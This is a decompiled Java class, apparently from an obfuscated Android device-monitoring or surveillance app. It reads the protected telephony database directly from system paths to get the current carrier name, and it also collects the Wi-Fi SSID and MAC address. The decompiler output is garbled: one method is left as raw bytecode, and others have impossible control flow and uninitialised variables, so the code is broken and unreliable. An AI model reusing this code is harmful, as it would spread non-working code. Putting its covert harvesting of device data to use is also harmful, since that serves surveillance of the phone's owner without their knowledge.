package com.vvt.z;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import com.vvt.io.d;
import java.io.File;

public class a
{
  private static final boolean a = com.vvt.ak.a.e;
  
  private static SQLiteDatabase a()
  {
    Object localObject1 = null;
    File[] arrayOfFile = new File[2];
    Object localObject2 = new java/io/File;
    ((File)localObject2).<init>("/data/data/com.android.providers.telephony/databases/telephony.db");
    arrayOfFile[0] = localObject2;
    int i = 1;
    localObject2 = new java/io/File;
    ((File)localObject2).<init>("/dbdata/databases/com.android.providers.telephony/telephony.db");
    arrayOfFile[i] = localObject2;
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localObject2 = "telephony";
    String str = "db";
    boolean bool = d.a(arrayOfFile, (String)localObject2, localStringBuilder, str);
    if (bool)
    {
      localObject1 = localStringBuilder.toString();
      int j = 17;
      localObject1 = a((String)localObject1, j);
    }
    return (SQLiteDatabase)localObject1;
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt))
    {
      try
      {
        localFile = new java/io/File;
        localFile.<init>(paramString);
        bool = localFile.exists();
        if (bool) {
          break label34;
        }
        bool = a;
        if (!bool) {}
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          File localFile;
          label34:
          boolean bool = a;
          if (!bool) {}
        }
      }
      return localSQLiteDatabase;
      bool = false;
      localFile = null;
    }
  }
  
  /* Error */
  public static String a(Context paramContext)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: ldc 61
    //   4: astore_2
    //   5: aload_0
    //   6: invokevirtual 67	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   9: astore_3
    //   10: ldc 69
    //   12: astore 4
    //   14: aload 4
    //   16: invokestatic 75	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   19: astore 4
    //   21: iconst_1
    //   22: istore 5
    //   24: iload 5
    //   26: anewarray 77	java/lang/String
    //   29: astore 6
    //   31: aconst_null
    //   32: astore 7
    //   34: ldc 79
    //   36: astore 8
    //   38: aload 6
    //   40: iconst_0
    //   41: aload 8
    //   43: aastore
    //   44: ldc 81
    //   46: astore 7
    //   48: aconst_null
    //   49: astore 8
    //   51: aload_3
    //   52: aload 4
    //   54: aload 6
    //   56: aload 7
    //   58: aconst_null
    //   59: aconst_null
    //   60: invokevirtual 87	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   63: astore 4
    //   65: aload 4
    //   67: ifnull +84 -> 151
    //   70: aload 4
    //   72: invokeinterface 92 1 0
    //   77: istore 9
    //   79: iload 9
    //   81: ifeq +70 -> 151
    //   84: iconst_0
    //   85: istore 9
    //   87: aconst_null
    //   88: astore_3
    //   89: aload 4
    //   91: iconst_0
    //   92: invokeinterface 96 2 0
    //   97: astore_3
    //   98: aload 4
    //   100: ifnull +10 -> 110
    //   103: aload 4
    //   105: invokeinterface 99 1 0
    //   110: aload_3
    //   111: areturn
    //   112: astore_3
    //   113: aconst_null
    //   114: astore 4
    //   116: invokestatic 102	com/vvt/z/a:removeFromPath	()Ljava/lang/String;
    //   119: astore_3
    //   120: aload 4
    //   122: ifnull -12 -> 110
    //   125: goto -22 -> 103
    //   128: aload_1
    //   129: ifnull +9 -> 138
    //   132: aload_1
    //   133: invokeinterface 99 1 0
    //   138: aload_3
    //   139: athrow
    //   140: astore_3
    //   141: aload 4
    //   143: astore_1
    //   144: goto -16 -> 128
    //   147: astore_3
    //   148: goto -32 -> 116
    //   151: aload_2
    //   152: astore_3
    //   153: goto -55 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	156	0	paramContext	Context
    //   1	143	1	localObject1	Object
    //   4	148	2	str1	String
    //   9	102	3	localObject2	Object
    //   112	1	3	localObject3	Object
    //   119	20	3	str2	String
    //   140	1	3	localObject4	Object
    //   147	1	3	localObject5	Object
    //   152	1	3	str3	String
    //   12	130	4	localObject6	Object
    //   22	3	5	i	int
    //   29	26	6	arrayOfString	String[]
    //   32	25	7	str4	String
    //   36	14	8	str5	String
    //   77	9	9	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   5	9	112	finally
    //   14	19	112	finally
    //   24	29	112	finally
    //   41	44	112	finally
    //   59	63	112	finally
    //   116	119	140	finally
    //   70	77	147	finally
    //   91	97	147	finally
  }
  
  private static String b()
  {
    str = "Not set";
    label39:
    do
    {
      try
      {
        localSQLiteDatabase = a();
        if (localSQLiteDatabase != null)
        {
          boolean bool1 = localSQLiteDatabase.isDbLockedByCurrentThread();
          if (!bool1)
          {
            bool1 = localSQLiteDatabase.isDbLockedByOtherThreads();
            if (!bool1) {
              break label39;
            }
          }
        }
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
      }
      finally
      {
        for (;;)
        {
          try
          {
            SQLiteDatabase localSQLiteDatabase;
            Object[] arrayOfObject;
            boolean bool2 = ((Cursor)localObject3).moveToFirst();
            if (bool2)
            {
              bool2 = false;
              localSQLiteDatabase = null;
              str = ((Cursor)localObject3).getString(0);
            }
            ((Cursor)localObject3).close();
            continue;
          }
          finally
          {
            Object localObject3;
            ((Cursor)localObject3).close();
          }
          localObject1 = finally;
        }
      }
      return str;
      localObject3 = "select name from carriers where current=1";
      arrayOfObject = null;
      arrayOfObject = new Object[0];
      localObject3 = String.format((String)localObject3, arrayOfObject);
      arrayOfObject = null;
      localObject3 = localSQLiteDatabase.rawQuery((String)localObject3, null);
    } while (localObject3 == null);
  }
  
  public static String b(Context paramContext)
  {
    for (Object localObject = "wifi";; localObject = ((WifiInfo)localObject).getSSID())
    {
      try
      {
        localObject = paramContext.getSystemService((String)localObject);
        localObject = (WifiManager)localObject;
        localObject = ((WifiManager)localObject).getConnectionInfo();
        String str2 = ((WifiInfo)localObject).getSSID();
        if (str2 != null) {
          continue;
        }
        localObject = "Not set";
      }
      catch (Exception localException)
      {
        for (;;)
        {
          String str1 = "Not set";
        }
      }
      return (String)localObject;
    }
  }
  
  public static String c(Context paramContext)
  {
    Object localObject = "wifi";
    try
    {
      localObject = paramContext.getSystemService((String)localObject);
      localObject = (WifiManager)localObject;
      localObject = ((WifiManager)localObject).getConnectionInfo();
      localObject = ((WifiInfo)localObject).getMacAddress();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        String str = "err";
      }
    }
    return (String)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/z/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */